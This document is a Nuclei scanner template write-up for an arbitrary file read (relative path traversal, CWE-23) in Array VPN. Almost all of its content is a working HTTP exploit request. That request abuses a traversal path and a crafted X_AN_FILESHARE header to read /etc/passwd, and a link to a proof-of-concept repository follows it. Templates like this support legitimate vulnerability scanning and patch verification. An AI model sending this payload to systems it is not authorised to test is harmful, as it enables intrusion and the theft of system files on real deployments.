# Nuclei Template: Array VPN - Arbitrary File Reading Vulnerability
**Template ID:** array-vpn-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`array-vpn-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Array VPN Arbitrary File Reading Vulnerability

## Steps to reproduce / Exploit Payload
```http
GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1
Host: {{Hostname}}
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
```

## References
- https://github.com/wy876/POC/blob/main/Array%20VPN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
